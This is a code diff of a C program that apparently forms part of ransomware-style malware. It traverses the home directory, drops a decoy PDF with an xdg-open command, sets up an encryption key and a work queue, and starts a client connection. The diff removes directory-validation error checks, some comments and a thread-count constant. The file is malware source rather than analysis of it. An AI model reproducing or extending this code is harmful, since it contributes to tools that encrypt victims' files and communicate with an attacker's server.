@@ -3,16 +3,12 @@
 #include <stdlib.h>
 #include <dirent.h>
 #include <sys/stat.h>
-#include <errno.h>
 
 #include "../../headers/encryption.h"
-#include "../../headers/thread.h"
 #include "../../headers/globals.h"
 #include "../../headers/client.h"
 #include "../../headers/watcher.h"
 #include "../../headers/pdf_data.h"
-
-const int THREADS_NUMBER = 8;
 
 void traverse(const char *path) {
 
@@ -25,7 +21,6 @@ void traverse(const char *path) {
     }
 
     while ((entry = readdir(dir)) != NULL) {
-        // Skip current and parent directory
         if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
             continue;
 
@@ -41,7 +36,6 @@ void traverse(const char *path) {
             continue;
         }
 
-        // skip links to avoid potential loops
         if (S_ISLNK(statbuf.st_mode)) {
             continue;
         }
@@ -70,22 +64,6 @@ int main() {
     snprintf(cmd, sizeof(cmd), "xdg-open '%s' &", temp_path);
     //system(cmd); Uncomment to open the pdf.
 
-    if (start_path == NULL) {
-        fprintf(stderr, "Home directory not found.\n");
-        return EXIT_FAILURE;
-    }
-
-    struct stat st;
-    if (stat(start_path, &st) == -1) {
-        fprintf(stderr, "stat failed on %s: %s\n", start_path, strerror(errno));
-        return EXIT_FAILURE;
-    }
-
-    if (!S_ISDIR(st.st_mode)) {
-        fprintf(stderr, "%s is not a directory\n", start_path);
-        return EXIT_FAILURE;
-    }
-
     //RAND_bytes(key, sizeof(key));
     initializeQueue(&queue);
 
@@ -93,5 +71,5 @@ int main() {
 
     startclient();
 
-    return 0; 
+    return 0;
 }
